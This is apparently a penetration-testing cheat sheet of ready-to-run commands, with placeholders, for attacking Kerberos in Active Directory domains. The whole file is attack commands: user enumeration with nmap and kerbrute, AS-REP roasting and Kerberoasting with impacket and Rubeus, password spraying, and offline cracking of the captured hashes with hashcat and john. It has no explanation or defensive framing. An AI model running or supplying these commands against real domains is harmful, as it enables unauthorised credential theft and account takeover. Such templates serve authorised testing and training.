# === NMAP KERBEROS SCRIPTS ===
nmap -sV -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm={{DOMAIN}} {{TARGET}}

# === USER ENUMERATION ===
kerbrute userenum -d {{DOMAIN}} --dc {{TARGET}} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
kerbrute userenum -d {{DOMAIN}} --dc {{TARGET}} users.txt

# === AS-REP ROASTING (no credentials needed) ===
impacket-GetNPUsers -dc-ip {{TARGET}} -request -usersfile users.txt {{DOMAIN}}
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# === PASSWORD SPRAYING ===
kerbrute passwordspray -d {{DOMAIN}} --dc {{TARGET}} users.txt {{PASS}}
.\kerbrute_windows_amd64.exe passwordspray -d {{DOMAIN}} users.txt "{{PASS}}"

# === KERBEROASTING (credentials required) ===
impacket-GetUserSPNs -dc-ip {{TARGET}} -outputfile kerb_hashes.txt {{DOMAIN}}/{{USER}}:{{PASS}}
.\Rubeus.exe kerberoast /outfile:kerb_hashes.txt
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt kerb_hashes.txt
